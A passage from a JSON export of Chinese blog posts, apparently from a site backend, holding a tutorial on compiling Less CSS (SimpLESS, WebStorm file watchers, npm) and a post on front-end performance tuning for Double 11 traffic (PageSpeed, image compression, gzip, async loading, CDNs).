style=\"line-height: 1.5em; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e第二种方法方便,实用,简单.不过要注意最终部署的时候 要使用编译好的css代码哦.\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e---------------------------另外俩种方法の分割线------------------------------\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 1.5em; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e第三种方法:使用Simpless软件, 我刚开始用less 的时候就是使用这个软件,我的感觉就是好用,方便.\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e如图:\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e1.你只要把 less文件拖拽进来\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443866156698276.png\" title=\"1443866156698276.png\" alt=\"blob.png\" width=\"415\" height=\"302\" style=\"width: 415px; height: 302px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e2.接下来你会看见simpless软件变成这样, 点击图中图标. 完成!\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443866207397656.png\" title=\"1443866207397656.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e然后只要你\u003cstrong\u003e一改动\u003c/strong\u003eless文件, 该软件就会编译好相应的css文件.\u003c/span\u003e\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0036.gif\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 12px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e(我建议不要修改输出路径, 就是那个css路径, 因为即使你修改了, 下次打开软件默认还是在less的同级目录下生成css文件,然后你又要改路径好麻烦)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443866382121999.png\" title=\"1443866382121999.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e最后一种方法, 也是我极力推荐的 : \u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(63, 63, 63);\"\u003e\u003cstrong\u003e在webstorm中使用less\u003c/strong\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"color: rgb(63, 63, 63); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cstrong\u003e俩点要求:\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\u003col class=\" list-paddingleft-2\" style=\"list-style-type: decimal;\"\u003e\u003cli\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"color: rgb(0, 0, 0); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e首先你要有webstorm编辑器\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"color: rgb(0, 0, 0); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e你要安装nodejs\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003c/ol\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e如果你还不知道 Webstorm(以下简称WS), 那么我强烈推荐你使用这款号称\u0026quot;前端开发神器\u0026quot;的工具来写你的Html,css与js代码, 它是Angularjs官方PDF文档首推前端开发工具.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e当然如果你有其它神器或者不想安装nodejs,可以不用继续往下看了, 那么第三种方法也是不错的选择.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e(在教程中会涉及一些Nodejs的基本知识, 都很浅, 不必畏惧)\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e第1步: 新建一个工程demo1, 并右击 =\u0026gt; new =\u0026gt; FILE\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443870385115484.png\" title=\"1443870385115484.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e第2步: 在弹出的命名窗口输入 demo.less (这样我们就在demo1工程中创建了一个less文件\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5em;\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 1.5em; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003ewebstorm会识别less文件, 并弹出如图绿色背景提示:\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 1.5em; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e意思是 : \u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px;\"\u003eFILE Watcher支持以\u003c/span\u003eLess为后缀的文件.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443870740615311.png\" title=\"1443870740615311.png\" alt=\"blob.png\" width=\"662\" height=\"110\" style=\"width: 662px; height: 110px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e第三步: 我们点击 ADD Watcher,在弹出的窗口配置(只要图中三点配置好就OK了)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443871277675469.png\" title=\"1443871277675469.png\" alt=\"blob.png\" width=\"613\" height=\"394\" style=\"width: 613px; height: 394px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e第四步 : Program为Node.exe所在的路径,你可以找一下就是下图这个\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443871401130777.png\" title=\"1443871401130777.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e至于Arguments 空格之前的那一大串, 每个人的不一样. 首先你要在nodejs中安装less.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e(如果你不知道有木有装过less, 再运行一下也无妨,当然你要联网哦)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443871494103056.png\" title=\"1443871494103056.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e安装成功后(其实这一步往往很多人不成功, 那么我建议你搜一下 \u0026quot;npm 淘宝镜像\u0026quot; ,这里我没办法细说, 这个配置并不复杂而且一劳永逸)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e然后现在你已经安装了less, 你要在node modules中找到一个叫做lessc 的文件, 然后把它的路径作为\u003cstrong\u003e第三步\u003c/strong\u003e中 Arguments空格之前的参数. 配置完成!\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443873032785717.png\" title=\"1443873032785717.png\" alt=\"blob.png\" width=\"556\" height=\"109\" style=\"width: 556px; height: 109px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 24px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e注意: 这里我们的路径是不一样的, 要知道自己的node modules路径,只需要在命令行中输入\u003c/span\u003e\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003enpm config list\u003cbr/\u003e\u003c/span\u003e\u003c/pre\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 24px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e你看我配置的prefix 和上面的路径的前缀一样吧. 如果你没有配置prefix, 那就是默认的cwd或者home路径, 我记不清哪个了....\u003c/span\u003e\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0009.gif\" width=\"25\" height=\"27\" style=\"width: 25px; height: 27px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 24px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443873333766008.png\" title=\"1443873333766008.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 24px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e第五步: 使用. 每当less文件一修改, 相应的css文件就会自动修改非常方便!!\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 24px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443873594626112.png\" title=\"1443873594626112.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 24px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003chr/\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e扯了这么多, 我们来说说 less最核心的功能.我结合我自己的实践说说.\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003col class=\" list-paddingleft-2\" style=\"list-style-type: decimal;\"\u003e\u003cli\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e层级 : 这是我认为less最好的地方.如图\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003c/ol\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443873877542759.png\" title=\"1443873877542759.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e2. 变量(变量作用域与 Js变量作用域原理相同)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443874015856977.png\" title=\"1443874015856977.png\" alt=\"blob.png\" width=\"513\" height=\"308\" style=\"width: 513px; height: 308px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e3. 函数\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443874175316756.png\" title=\"1443874175316756.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e4. 导入文件(这个功能非常强大, 尤其在模块开发的时候, 把一个个模块的css剥离出来)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443874358136217.png\" title=\"1443874358136217.png\" alt=\"blob.png\" width=\"577\" height=\"416\" style=\"width: 577px; height: 416px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003eLess非常强大, 但是我平时大概也只用到这几个功能, 不过我个人认为也是其最核心的功能. 我不建议一上手就去记许多less 的函数等等, 用到的时候查一下就好了嘛.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e好吧, 今天就到这里吧, 我去吃饭喽...\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cbr/\u003e\u003c/p\u003e",
        "createdAt": "2015-10-16T09:42:54.624Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-10-13T11:43:00.000Z"
        },
        "desc": "\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e俗话说的好, 工欲善其事必先利其器! 而Less就是前端开发不可多得的神器之一.\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e有了它\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em; text-indent: 2em;\"\u003e1.至少提高100%的css开发效率\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em; text-indent: 2em;\"\u003e2.降低css的50%维护成本\u003c/p\u003e\u003cp style=\"line-height: 1.5em; text-indent: 2em;\"\u003e3.等等...\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e那么话不多说, less 是什么?\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003eLess是一款css预编译器.\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003csub\u003e小白:我擦,这么简洁,我要百度一下:搜到三个相关的Less.js, less, simpless, \u003cspan style=\"line-height: 24px;\"\u003e什么鬼!\u003c/span\u003e到底哪个才是?怎么使用啊?\u003c/sub\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cbr/\u003e\u003c/p\u003e\u003chr/\u003e\u003cp style=\"line-height: 1.5em;\"\u003e好吧,欲知详情,点击下方 \u003cstrong\u003eShow Detail\u003c/strong\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cstrong\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443864595285085.png\" title=\"1443864595285085.png\" alt=\"blob.png\"/\u003e\u003c/strong\u003e\u003c/p\u003e",
        "hasContent": true,
        "is_delete": false,
        "objectId": "NVoAJ39tLl",
        "stamps": "Less,CSS,前端工具",
        "title": "前端神器之Less(css预编译工具)\n",
        "types": "b1e,b12e",
        "updatedAt": "2015-12-05T03:28:25.381Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e先把牛掰的工具拿出来分享一波, 这些工具也是百度等前端团队推荐的前端优化工具.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e1.\u0026nbsp;\u003ca href=\"https://developers.google.com/speed/pagespeed/insights/\" target=\"_blank\"\u003eGoogle PageSpeed\u003c/a\u003e\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;--- 应该要翻墙, 不过这年头连墙都不会翻, 可以回家种田了.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e2.\u0026nbsp;\u003ca href=\"http://yslow.org/\" target=\"_blank\"\u003eYSlow\u003c/a\u003e\u0026nbsp; ---\u0026nbsp;雅虎公司推出的前端优化工具, 浏览器插件(多平台支持)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;好吧, 工具不说太多, 这俩个工具都很优秀, 我最喜欢Pagespeed, 因为Google的产品一向以UI打动我... \u0026nbsp;俩者缺点也有,就是都不能提供代码级别的优化方案, (就是不能告诉你这地方这地方应该用快速排序算法而不是冒泡排序.) 但同时也不要迷信他们的解决方案, 因为有些是没法实施的.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003chr style=\"white-space: normal;\"/\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e我们所做的优化如下 :\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e1.\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;减小首页图片大小, 这个PageSpeed都有帮我们做(如下图), 根据它的算法, 我们首页的图片可以减少340K, 我们只选了其中几张优化明显的图片, 不然工作量有点大. (优化后的资源, 在页面底部有个下载链接哦) \u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e注意 : Google 的图片优化方案是有危险的, 比如首页一张200x200px的图片以100x100px的大小展示, 那么它就会优化到100x100px的图片, 但如果页面其他地方用到这张图片就会出现明显的失真!\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"http://www.meajax.com/ueditor/php/upload/image/20151108/1446948203906605.png\" title=\"1446948203906605.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"http://www.meajax.com/ueditor/php/upload/image/20151108/1446947908654788.png\" title=\"1446947908654788.png\" alt=\"blob.png\" width=\"524\" height=\"246\" style=\"width: 524px; height: 246px;\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e2.\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;Css, Js资源文件用法同上. 但这里有个有趣的梗. 就是某些服务器提供商会自动对css,js资源Gzip压缩后传输给浏览器. 看下图 (Chrome Network面板截图):\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(255, 0, 0); background-color: rgb(255, 255, 255);\"\u003e红色\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e表示实际网络传输文件大小,\u0026nbsp;\u003cspan style=\"color: rgb(0, 176, 240);\"\u003e蓝色\u003c/span\u003e表示实际文件大小\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e我们使用的阿里云的服务器, 可以看到css, js以及文档都在传到浏览器前被压缩了, 而这个是阿里云自动完成的.但是图片不行. 所以, 我们对Css, JS文件压缩混淆也许并无多大效果.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"http://www.meajax.com/ueditor/php/upload/image/20151108/1446948672409033.png\" title=\"1446948672409033.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e3.\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;某些非重要内容模块化并且异步加载, 比如许多中小网站都加了双11的CPS广告, 这个完全可以模块化到一个Js文件中, 然后异步加载. 详情见我的另一篇文章seajs模块化. 这里模块化, 你肯定会需要用到一个工具,\u0026nbsp;\u003ca href=\"http://www.css88.com/tool/html2js/\" target=\"_blank\"\u003ehtml 转 Js.\u003c/a\u003e\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e它形如这样 :\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003e[\u0026quot;\u0026lt;div\u0026gt;\u0026quot;,\n\u0026quot;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;Hello\u0026nbsp;World\u0026quot;,\n\u0026quot;\u0026lt;/div\u0026gt;\u0026quot;].join(\u0026quot;\u0026quot;);\u003c/pre\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e4.\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;还有一些实践诸如 css放在文档头部, 并且用外部文件引入. 可以快速显示页面, 并缓存css.\u0026nbsp;\u003cbr/\u003e但是Js文件放在底部的方法可行度并不是很高. 因为我们的页面很多地方都有嵌入Js片段的情况,而这些片段很可能用到某些函数库, 那么该怎么办呢 ?\u003cbr/\u003e我的建议是 :\u003cbr/\u003e\u0026nbsp;除了jquery.js函数库放在头部外, 其它函数库都放在文档底部. 然后js代码片段都包在如下图\u003c/span\u003e\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003e$(function\u0026nbsp;()\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;文档加载完成,\u0026nbsp;底部的函数库也加载完成了\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;代码片段放在这里\n});\u003c/pre\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e其实这种方法可行度也不高, 因为许多现有代码片段都木有包裹在这种结构中, 我不可能一个一个去改吧. 所以, 表急还有一个方案..\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e5.\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;所有前端资源放在CDN上面, 管它什么头部底部,快到没盆友.这就是人民币玩家与我等钓丝玩家的差距...\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0033.gif\" style=\"float: right;\"/\u003e\u0026nbsp;...\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cbr/\u003e\u003c/p\u003e",
        "createdAt": "2015-11-08T02:45:32.127Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-11-08T02:45:32.000Z"
        },
        "desc": "\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;一年一度的双11又到了, 这年头如果双11和自己公司没点什么关系的话, 都不好意思叫自己互联网公司...\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 32px;\"\u003e\u0026nbsp; 先说个数据吧, 我们公司双11的时候流量大概是平时的三倍, 平时服务器的CPU一直稳定在25%左右. 所及针对特别节日(光棍节 o(╯□╰)o)做点优化很有必要.\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;本文不谈代码级别的优化, 因为那个是内功, 需要时间的积累以及平时写代码的规范与合理, 咱们就谈谈突击优化怎么做. 还有咱们只谈前端优化, 因为后台优化的功力俺还不行....\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0075.gif\" style=\"float: right;\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u003cimg src=\"/ueditor/php/upload/image/20151108/1446949762364650.png\" title=\"1446949762364650.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft 